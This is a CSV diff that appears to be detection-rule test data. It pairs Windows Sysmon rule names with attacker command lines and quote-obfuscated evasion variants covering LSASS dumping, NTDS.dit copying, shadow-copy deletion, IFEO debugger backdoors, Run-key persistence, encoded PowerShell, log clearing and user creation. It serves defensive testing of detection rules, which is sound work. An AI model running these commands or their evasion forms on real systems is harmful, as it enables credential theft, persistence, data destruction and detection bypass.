+win_control_panel_item,Microsoft-Windows-Sysmon_1_Match_02.json,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs"" /v spotless /d C:\some\other\malicious\lib.cpl"
+win_copying_sensitive_files_with_credential_data,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"esentutl.exe /""m"" C:\Users\<user>\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat /v""ss""rec V01 ."
+win_copying_sensitive_files_with_credential_data,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\N""TDS\NT""DS.dit C:\temp\system"
+win_copying_sensitive_files_with_credential_data,Microsoft-Windows-Sysmon_1_Match_01.json,esentutl.exe /y C:\Users\<user>\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat /vssrec V01 . /d c:\exports\webcachev01.dat
+win_copying_sensitive_files_with_credential_data,Microsoft-Windows-Sysmon_1_Match_03.json,cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\NTDS.dit C:\temp\system
+win_copying_sensitive_files_with_credential_data,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"esentutl.exe /""y"" C:\Users\<user>\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat /v""s""srec V01 . /""d"" c:\exports\webcachev01.dat"
+win_copying_sensitive_files_with_credential_data,Microsoft-Windows-Sysmon_1_Match_02.json,esentutl.exe /m C:\Users\<user>\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat /vssrec V01 .
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"wmic ""shadowcopy"" ""delete"""
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\ny\uepyb\..\..\Windows\pchdw\s\..\..\system32\k\aph\..\..\wbem\c\..\wmic.exe"" shadowcopy   delete  "
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""C:\ny\uepyb\..\..\Windows\pchdw\s\..\..\sy""stem""32\k\aph\..\..\wbem\c\..\wmic.exe"" ""shadowcopy"" ""delete"""
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Match_01.json,wmic.exe shadowcopy delete
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\ny\uepyb\..\..\Windows\pchdw\s\..\..\system32\k\aph\..\..\wbem\c\..\wmic.exe"" shadowcopy delete"
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,wmic.exe shadowcopy   delete  
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Match_04.json,"""C:\ny\uepyb\..\..\Windows\pchdw\s\..\..\system32\k\aph\..\..\wbem\c\..\wmic.exe"" shadowcopy delete"
+win_crime_maze_ransomware,Microsoft-Windows-Sysmon_1_Match_02.json,wmic shadowcopy delete
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"s""""hu""tdo""wn ""/r"" /""""f ""/""t ""0""0"
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,shutdown -r -f -t 00
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,net.exe stop superbackupman
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,net   stop   superbackupman
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Match_01.json,shutdown /r /f /t 00
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Match_03.json,shutdown /r /f /t 00
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,shutdown.exe    /r    /f    /t    00
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Match_04.json,net stop superbackupman
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Match_06.json,net stop superbackupman
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"n""""e""t"" s""t""o""""p ""th""em""""e""s"""
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Match_02.json,shutdown /r /f /t 00
+win_crime_snatch_ransomware,Microsoft-Windows-Sysmon_1_Match_05.json,net stop superbackupman
+win_data_compressed_with_rar,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"rar ""a"" C:\Users\Alice\exfiltrate.rar C:\Users\Alice\Images"
+win_data_compressed_with_rar,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"rar ""a"" C:\Sensitive\Data\export.rar C:\Sensitive\Data"
+win_data_compressed_with_rar,Microsoft-Windows-Sysmon_1_Match_01.json,rar a C:\Temp\myarchive.rar C:\Users\Mal\Desktop\data
+win_data_compressed_with_rar,Microsoft-Windows-Sysmon_1_Match_03.json,rar a C:\Sensitive\Data\export.rar C:\Sensitive\Data
+win_data_compressed_with_rar,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"rar ""a"" C:\Temp\myarchive.rar C:\Users\Mal\Desktop\data"
+win_data_compressed_with_rar,Microsoft-Windows-Sysmon_1_Match_02.json,rar a C:\Users\Alice\exfiltrate.rar C:\Users\Alice\Images
+win_dsquery_domain_trust_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"nltest.exe /do""m""ain_t""rust""s"
+win_dsquery_domain_trust_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"nltest.exe /domain_t""rus""ts"
+win_dsquery_domain_trust_discovery,Microsoft-Windows-Sysmon_1_Match_01.json,nltest.exe /domain_trusts
+win_dsquery_domain_trust_discovery,Microsoft-Windows-Sysmon_1_Match_03.json,nltest.exe /domain_trusts
+win_dsquery_domain_trust_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"nltest.exe /do""main""_tru""s""ts"
+win_dsquery_domain_trust_discovery,Microsoft-Windows-Sysmon_1_Match_02.json,nltest.exe /domain_trusts
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"wevtutil c""le""ar-l""""og Microsoft-Windows-WMI-Activity/Tr""""ace"
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"wevtutil s""""et-l""o""g -""e"":f""als""e Microsoft-Windows-WMI-Actitivy/Trace"
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"wevtutil.exe s""""l -e:fa""ls""e Microsoft-Windows-WMI-Actitivy/Trace"
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Match_01.json,wevtutil.exe cl Microsoft-Windows-WMI-Activity/Trace
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Match_03.json,wevtutil set-log /e:false Microsoft-Windows-WMI-Actitivy/Trace
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"wevtutil.exe c""""l Microsoft-Windows-WMI-Activity/T""rac""e"
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Match_04.json,wevtutil.exe sl /e:false Microsoft-Windows-WMI-Actitivy/Trace
+win_etw_trace_evasion,Microsoft-Windows-Sysmon_1_Match_02.json,wevtutil clear-log Microsoft-Windows-WMI-Activity/Trace
+win_exploit_cve_2020_1048,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell.exe -c A""d""d-Pr""int""erPort -N""""a""m""e ""C:\Users\User\Desktop\updater.dll"""
+win_exploit_cve_2020_1048,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -c Add-PrinterDriver -Name \""Ge""ner""ic / Text Only\"""
+win_exploit_cve_2020_1048,Microsoft-Windows-Sysmon_1_Match_01.json,"powershell -c Add-PrinterPort -Name ""C:\Temp\mal.exe"""
+win_exploit_cve_2020_1048,Microsoft-Windows-Sysmon_1_Match_03.json,"powershell -c Add-PrinterDriver -Name ""Generic / Text Only"""
+win_exploit_cve_2020_1048,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell -c Add-PrinterPort    -Name ""C:\Temp\mal.exe"""
+win_exploit_cve_2020_1048,Microsoft-Windows-Sysmon_1_Match_02.json,"powershell.exe -c Add-PrinterPort -Name ""C:\Users\User\Desktop\updater.dll"""
+win_hack_koadic,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cmd.exe /q /c c""""h""c""p "
+win_hack_koadic,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,cmd /q /c chcp 
+win_hack_koadic,Microsoft-Windows-Sysmon_1_Match_01.json,cmd.exe /q /c chcp 
+win_hack_koadic,Microsoft-Windows-Sysmon_1_Match_03.json,cmd.exe /q /c chcp 
+win_hack_koadic,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,cmd.exe   /q   /c   chcp 
+win_hack_koadic,Microsoft-Windows-Sysmon_1_Match_02.json,cmd.exe /q /c chcp 
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\Curre""ntVer""sion\Image File Exec""ut""ion Options\ut""il""man.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\Current""Vers""ion\Image File Execution Op""tio""ns\osk.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dis""play""switch.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\I""mag""e File Execution Options\mag""ni""fy.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Match_01.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Match_03.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\Cur""rent""Version\I""ma""ge F""il""e Ex""ec""ution Op""ti""ons\se""th""c.e""x""e"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\Curr""ent""Version\Im""ag""e F""il""e Exe""cut""ion O""pt""ions\at""broke""r.e""x""e"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Match_04.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Match_06.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\displayswitch.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\Curre""ntVe""rsion\Image File Execution Options\na""rr""ator.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Match_07.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Match_02.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_install_reg_debugger_backdoor,Microsoft-Windows-Sysmon_1_Match_05.json,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f"
+win_interactive_at,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"at 00:00 /in""ter""active cmd.exe /c ipconfig"
+win_interactive_at,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"at 18:00 /i""n""ter mal.exe"
+win_interactive_at,Microsoft-Windows-Sysmon_1_Match_01.json,at.exe 12:00 /interactive notepad.exe
+win_interactive_at,Microsoft-Windows-Sysmon_1_Match_03.json,at 18:00 /interactive mal.exe
+win_interactive_at,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,at.exe 12:00 /i notepad.exe
+win_interactive_at,Microsoft-Windows-Sysmon_1_Match_02.json,at 00:00 /interactive cmd.exe /c ipconfig
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,cmdkey.exe /l
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cmd.exe /c ""dir"" \Users\"
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"net u""se""r"
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Match_01.json,cmdkey /list
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Match_03.json,cmd.exe /c dir \Users\
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,cmdkey -list
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Match_04.json,net user
+win_local_system_owner_account_discovery,Microsoft-Windows-Sysmon_1_Match_02.json,cmdkey.exe /list
+win_lsass_dump,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"procdump.exe l""sa""ss -o de""fnotlsa""ss.dmp"
+win_lsass_dump,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"procdump ls""as""s -o ma""lsa""ss.dmp"
+win_lsass_dump,Microsoft-Windows-Sysmon_1_Match_01.json,procdump.exe lsass -o lsass.dmp
+win_lsass_dump,Microsoft-Windows-Sysmon_1_Match_03.json,procdump lsass -o malsass.dmp
+win_lsass_dump,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"procdump.exe ls""""ass -o l""sa""ss.""dmp"""
+win_lsass_dump,Microsoft-Windows-Sysmon_1_Match_02.json,procdump.exe lsass -o defnotlsass.dmp
+win_mal_adwind,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,cscript %TEMP%\Retrive2646804049303142888.vbs 
+win_mal_adwind,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cs""cri""pt.exe %TEMP%\Ret""ri""ve2670234531104625201.v""bs"" "
+win_mal_adwind,Microsoft-Windows-Sysmon_1_Match_01.json,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v cRwUMdaPVwP /t REG_EXPAND_SZ /d ""\""\AppData\Roaming\Oracle\bin\javaw.exe \"" -jar \""%USERPROFILE%\sgazsBZvxHC\GKPKtwfspIg.ddKgDj\"""" /f"
+win_mal_adwind,Microsoft-Windows-Sysmon_1_Match_03.json,cscript.exe %TEMP%\Retrive2670234531104625201.vbs 
+win_mal_adwind,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v cRwUMdaPVwP /t REG_EXPAND_SZ /d ""\""\App""Dat""a\Ro""ami""ng\Or""ac""le\bin\ja""vaw.ex""e \"" -jar \""%USERPROFILE%\sgazsBZvxHC\GKPKtwfspIg.ddKgDj\"""" /f"
+win_mal_adwind,Microsoft-Windows-Sysmon_1_Match_02.json,cscript.exe %TEMP%\Retrive2646804049303142888.vbs 
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -w hidden -enco JABG""AGw""AeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQBhAHcAcABjAHkAcgBrACcAOwAkAFYAdwBnAHkAbwBzAGwAcwBzAGgAbgBzACAAPQAgACcANwA3ACcAOwAkAFMAbwByAHcAeAB1AHUAcQBzAD0AJwBXAHQAcwB4AG4AcgBwAGwAeQBqAGMAeABjACcAOwAkAEkAbgBhAHcAbgBqAHQAbABhAD0AJA""BlAG""4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACc"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -e P""AA""jACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABZAFgAVQBRAEMAQgBRAFoAdwBEAD0AJwBWAGMAQQAxAFUAdwAxAFoAJwA7ACQAVQA0AFoAVQBrADQAQQBvADEANAB3AHcAQgAgAD0AIAAnADcAOAA0ACcAOwAkAFYAYwA0AHgAQQBHAEEAQQA9ACcAQwBCAF8AVQBBAFUAQQBjAGsAQQBBACcAOwAkAE4ARABVAF8AUQBHAEQAUQA9ACQAZQBuAHYAOg""B1""AHMA""ZQ""ByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQAV"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"powershell -enco AvACcA""Lg""AiAHMAYABwAEwAaQBUACIA""KAAn""ACoAJwApADsAJABMAFoAYwBaAEcAQQBBADEAUQ"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"powershell -enco kAGUAbgB2ADoAdQBz""AGUA""cgBwAH""IA""bwBmAGkAbABlA"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_01.json,powershell -enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_03.json,powershell -e PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABZAFgAVQBRAEMAQgBRAFoAdwBEAD0AJwBWAGMAQQAxAFUAdwAxAFoAJwA7ACQAVQA0AFoAVQBrADQAQQBvADEANAB3AHcAQgAgAD0AIAAnADcAOAA0ACcAOwAkAFYAYwA0AHgAQQBHAEEAQQA9ACcAQwBCAF8AVQBBAFUAQQBjAGsAQQBBACcAOwAkAE4ARABVAF8AUQBHAEQAUQA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQAV
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell -""""enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"powershell -w hidden -enco iACgAJ""wA""qACcAKQA7ACQA"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_04.json,powershell -enco kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"powershell -w hidden -enco JABGAG""wAeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQ""BhAHcAcABjAH"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_06.json,powershell -enco AvACcALgAiAHMAYABwAEwAaQBUACIAKAAnACoAJwApADsAJABMAFoAYwBaAEcAQQBBADEAUQ
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"powershell -enco IgAoA""CcAK""gAn""ACk""AOwAkA"
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_07.json,powershell -w hidden -enco iACgAJwAqACcAKQA7ACQA
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_02.json,powershell -w hidden -enco JABGAGwAeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQBhAHcAcABjAHkAcgBrACcAOwAkAFYAdwBnAHkAbwBzAGwAcwBzAGgAbgBzACAAPQAgACcANwA3ACcAOwAkAFMAbwByAHcAeAB1AHUAcQBzAD0AJwBXAHQAcwB4AG4AcgBwAGwAeQBqAGMAeABjACcAOwAkAEkAbgBhAHcAbgBqAHQAbABhAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACc
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_08.json,powershell -w hidden -enco JABGAGwAeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQBhAHcAcABjAH
+win_malware_emotet,Microsoft-Windows-Sysmon_1_Match_05.json,powershell -enco IgAoACcAKgAnACkAOwAkA
+win_malware_ryuk,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"REG ADD ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""svchos"" /t REG_SZ /d ""C:\us""er""s\Pu""bl""ic\QsibK.exe"" /f "
+win_malware_ryuk,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"REG ADD ""HKEY_CURRENT_USER\SOFTWARE\Mi""cros""oft\W""ind""ows\Curre""ntVersi""on\Run"" /v ""svchos"" /t REG_SZ /d ""C:\us""er""s\Pu""bl""ic\QsibK.exe"" /f "
+win_malware_ryuk,Microsoft-Windows-Sysmon_1_Match_01.json,"REG ADD ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""svchos"" /t REG_SZ /d ""C:\users\Public\QsibK.exe"" /f "
+win_malware_ryuk,Microsoft-Windows-Sysmon_1_Match_03.json,"REG ADD ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""svchos"" /t REG_SZ /d ""C:\users\Public\QsibK.exe"" /f "
+win_malware_ryuk,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"REG ADD ""HKEY_CURRENT_USER\SOFTWARE\Mic""roso""ft\Wi""nd""ows\Cur""rent""Version\R""u""n"" /v ""svchos"" /t REG_SZ /d ""C:\users\Public\QsibK.exe"" /f "
+win_malware_ryuk,Microsoft-Windows-Sysmon_1_Match_02.json,"REG ADD ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""svchos"" /t REG_SZ /d ""C:\users\Public\QsibK.exe"" /f "
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cscript C:\\Us""er""s\myuser\notmalicious.""vbe"" input"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_09.json,wscript C:\ProgramData\SystemHelper\performance.vba boost
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"wscript ""C:\Us""ers\Tom\service.""j""s update"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"cscript C:\ProgramData\installer.""jse"" install"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"cscript.exe ""C"":\U""se""rs\Alice\helper.v""b""a run"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_10.json,"cscript ""C:\ProgramData\System\update.vbs"" install"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_01.json,wscript.exe C:\Users\Mustermann\Desktop\hello.jse param
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_03.json,wscript C:\Users\Tom\service.js update
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"wscript.exe ""C"":\\\Us""""ers\\Mustermann\Desktop\hello.j""s""e param"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"wscript C:\\ProgramData\ABCStudio\ABCStudio.v""b""e install"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_04.json,cscript.exe C:\Users\Alice\helper.vba run
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"cscript ""C:\Pr""ogramData\MovieWatcher\MovieWatcher.""js"" start"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_06.json,cscript C:\ProgramData\installer.jse install
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,wscript.exe C:\\\Users\Bob\Desktop\helper.vbs install
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_07.json,wscript C:\ProgramData\ABCStudio\ABCStudio.vbe install
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_02.json,cscript C:\Users\myuser\notmalicious.vbe input
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"wscript C:\\ProgramData\SystemHelper\performance.""vba"" boost"
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_08.json,cscript C:\ProgramData\MovieWatcher\MovieWatcher.js start
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_05.json,wscript.exe C:\Users\Bob\Desktop\helper.vbs install
+win_malware_script_dropper,Microsoft-Windows-Sysmon_1_Match_10.json,cscript C:\ProgramData\System\update.vbs install
+win_malware_trickbot_recon_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"nltest ""/domain_trusts"" /all""_""trusts"
+win_malware_trickbot_recon_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"nltest.exe ""/domain_trusts""   ""/all_trusts"""
+win_malware_trickbot_recon_activity,Microsoft-Windows-Sysmon_1_Match_01.json,nltest.exe /domain_trusts /all_trusts
+win_malware_trickbot_recon_activity,Microsoft-Windows-Sysmon_1_Match_03.json,nltest.exe /domain_trusts /all_trusts
+win_malware_trickbot_recon_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,nltest.exe /domain_trusts    /all_trusts
+win_malware_trickbot_recon_activity,Microsoft-Windows-Sysmon_1_Match_02.json,nltest /domain_trusts /all_trusts
+win_malware_wannacry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"b""""cd""ed""it.exe   /""set""  ""{de""fau""lt""}   re""cover""yen""able""d   n""""o"
+win_malware_wannacry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"w""bad""min.exe   de""le""te    ca""tal""og    -""qu""iet"
+win_malware_wannacry,Microsoft-Windows-Sysmon_1_Match_01.json,icacls . /grant Everyone:F /T /C /Q
+win_malware_wannacry,Microsoft-Windows-Sysmon_1_Match_03.json,wbadmin delete catalog -quiet
+win_malware_wannacry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"i""cac""ls . ""/grant""    ""Eve""ryone:""F""   ""/T""    /""""Q    ""/""C"
+win_malware_wannacry,Microsoft-Windows-Sysmon_1_Match_02.json,bcdedit /set {default} recoveryenabled no
+win_net_enum,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"net.exe vi""""ew"
+win_net_enum,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"net v""ie""w /all"
+win_net_enum,Microsoft-Windows-Sysmon_1_Match_01.json,net view
+win_net_enum,Microsoft-Windows-Sysmon_1_Match_03.json,net view /all
+win_net_enum,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net v""""i""e""w"
+win_net_enum,Microsoft-Windows-Sysmon_1_Match_02.json,net.exe view
+win_net_user_add,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\System32\net1 us""""er /a""d""d srvcusr usrpsswrd123"
+win_net_user_add,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"net u""s""er /a""""dd name passwd"
+win_net_user_add,Microsoft-Windows-Sysmon_1_Match_01.json,net user /add mynewuser secretpasswd123
+win_net_user_add,Microsoft-Windows-Sysmon_1_Match_03.json,net user /add name passwd
+win_net_user_add,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net u""""s""e""r /add mynewusr secretpasswd123"
+win_net_user_add,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\net1 user /add srvcusr usrpsswrd
+win_netsh_allow_port_rdp,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"n""""e""t""sh adv""""fire""wal""l fire""""wa""ll"" a""""d""d"" r""u""l""""e ac""""tion=a""""l""l""ow p""ro""tocol=T""C""P loc""al""port=""3""38""""9 dir=in name=rlnm"
